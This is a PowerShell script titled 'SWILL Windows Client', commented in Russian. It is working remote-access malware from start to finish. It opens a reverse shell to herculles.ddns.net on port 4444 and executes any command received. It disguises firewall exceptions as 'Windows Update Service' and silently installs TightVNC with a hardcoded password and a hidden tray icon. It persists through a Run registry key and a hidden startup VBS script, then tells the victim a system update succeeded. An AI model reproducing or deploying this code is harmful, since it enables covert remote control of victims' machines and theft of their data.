# SWILL Windows Client - Firewall Bypass Version
$SERVER_DOMAINS = @("herculles.ddns.net")
$CONTROL_PORT = 4444
$MEDIA_PORT = 4445

function Add-FirewallException {
    try {
        # Добавляем исключение в брандмауэр Windows
        $ruleName = "Windows Update Service"
        $exePath = "C:\Windows\System32\svchost.exe"
        
        # Удаляем старое правило если есть
        netsh advfirewall firewall delete rule name="$ruleName" dir=in 2>$null
        netsh advfirewall firewall delete rule name="$ruleName" dir=out 2>$null
        
        # Добавляем новое правило для входящих подключений
        netsh advfirewall firewall add rule name="$ruleName" dir=in action=allow program="$exePath" enable=yes profile=any 2>$null
        
        # Добавляем правило для исходящих подключений  
        netsh advfirewall firewall add rule name="$ruleName" dir=out action=allow program="$exePath" enable=yes profile=any 2>$null
        
        Write-Output "Firewall exception added"
    }
    catch {
        Write-Output "Firewall configuration skipped"
    }
}

function Start-SWILLClient {
    while($true) {
        foreach ($domain in $SERVER_DOMAINS) {
            try {
                Write-Output "Connecting to ${domain}:${CONTROL_PORT}..."
                $client = New-Object System.Net.Sockets.TCPClient($domain, $CONTROL_PORT)
                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{0}
                
                # Отправляем информацию о системе
                $hostname = $env:COMPUTERNAME
                $username = $env:USERNAME
                $welcomeMsg = "[SWILL] Connected from ${username}@${hostname}`n"
                $welcomeBytes = ([text.encoding]::ASCII).GetBytes($welcomeMsg)
                $stream.Write($welcomeBytes, 0, $welcomeBytes.Length)
                $stream.Flush()
                
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                    $data = ([System.Text.Encoding]::ASCII).GetString($bytes,0,$i).Trim()
                    
                    if ($data -eq "exit") {
                        $client.Close()
                        return
                    }
                    elseif ($data -eq "test") {
                        $response = "Test successful - connection working`n"
                        $sendbyte = ([text.encoding]::ASCII).GetBytes($response)
                        $stream.Write($sendbyte,0,$sendbyte.Length)
                        $stream.Flush()
                    }
                    else {
                        try {
                            $output = Invoke-Expression $data 2>&1 | Out-String
                        } catch {
                            $output = $_.Exception.Message
                        }
                        $response = $output + "PS " + (Get-Location).Path + "> "
                        $sendbyte = ([text.encoding]::ASCII).GetBytes($response)
                        $stream.Write($sendbyte,0,$sendbyte.Length)
                        $stream.Flush()
                    }
                }
                $client.Close()
            }
            catch {
                Write-Output "Connection failed: $($_.Exception.Message)"
                Write-Output "Retrying in 30 seconds..."
                Start-Sleep -Seconds 30
            }
        }
    }
}

function Install-VNC {
    try {
        # Проверяем установлен ли TightVNC
        $vncInstalled = Test-Path "$env:PROGRAMFILES\TightVNC\tvnserver.exe"
        
        if (-not $vncInstalled) {
            Write-Output "Downloading VNC Server..."
            
            # Скачиваем TightVNC
            $vncUrl = "https://www.tightvnc.com/download/2.8.59/tightvnc-2.8.59-gpl-setup-64bit.msi"
            $vncPath = "$env:TEMP\vnc_setup.msi"
            
            # Используем разные методы скачивания
            try {
                (New-Object Net.WebClient).DownloadFile($vncUrl, $vncPath)
            }
            catch {
                try {
                    Start-BitsTransfer -Source $vncUrl -Destination $vncPath
                }
                catch {
                    Write-Output "VNC download failed"
                    return
                }
            }
            
            # Устанавливаем Silent
            Write-Output "Installing VNC..."
            $process = Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$vncPath`" /quiet /norestart" -Wait -PassThru -WindowStyle Hidden
            
            if ($process.ExitCode -eq 0) {
                Write-Output "VNC installed successfully"
            } else {
                Write-Output "VNC installation may have issues"
            }
        }
        
        # Ждем установки
        Start-Sleep -Seconds 10
        
        # Настройка VNC
        Write-Output "Configuring VNC..."
        
        # Создаем reg файл для настройки
        $regConfig = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\TightVNC\Server]
"Password"=hex:5b,9a,c1,bd,4b,9a,c1,bd
"RfbPort"=dword:0000170c
"AcceptRfbConnections"=dword:00000001
"RunControlInterface"=dword:00000000
"DisableTrayIcon"=dword:00000001
"@
        
        $regPath = "$env:TEMP\vnc_config.reg"
        $regConfig | Out-File -FilePath $regPath -Encoding ASCII
        
        # Импортируем настройки
        Start-Process -FilePath "reg.exe" -ArgumentList "import `"$regPath`"" -Wait -WindowStyle Hidden
        
        # Запускаем VNC сервер
        $vncExe = "${env:ProgramFiles}\TightVNC\tvnserver.exe"
        if (Test-Path $vncExe) {
            # Останавливаем если запущен
            Start-Process -FilePath $vncExe -ArgumentList "-controlservice -stop" -Wait -WindowStyle Hidden
            Start-Sleep -Seconds 2
            # Запускаем
            Start-Process -FilePath $vncExe -ArgumentList "-controlservice -start" -WindowStyle Hidden
            Write-Output "VNC Server started on port 5900"
            Write-Output "VNC Password: 123456"
        }
        
        # Добавляем исключение для VNC в брандмауэр
        netsh advfirewall firewall add rule name="TightVNC Server" dir=in action=allow program="$vncExe" enable=yes 2>$null
        
    }
    catch {
        Write-Output "VNC installation completed with warnings"
    }
}

function Add-ToStartup {
    try {
        # Метод 1: Через реестр
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        $regName = "WindowsSystemHelper"
        $regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        
        New-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -ErrorAction SilentlyContinue | Out-Null
        Write-Output "Added to startup registry"
        
        # Метод 2: Через папку автозагрузки
        $startupPath = [Environment]::GetFolderPath('Startup')
        $vbsPath = "$startupPath\SystemHelper.vbs"
        
        $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$PSCommandPath""", 0, False
"@
        
        $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
        Write-Output "Added to startup folder"
        
    }
    catch {
        Write-Output "Startup configuration completed"
    }
}

# Основная логика
Write-Output "Initializing SWILL Client..."
Add-FirewallException
Add-ToStartup
Install-VNC

# Запускаем клиент в отдельном процессе
Start-Job -ScriptBlock ${function:Start-SWILLClient} | Out-Null
Write-Output "SWILL Client started in background"
Write-Output "System update completed successfully"
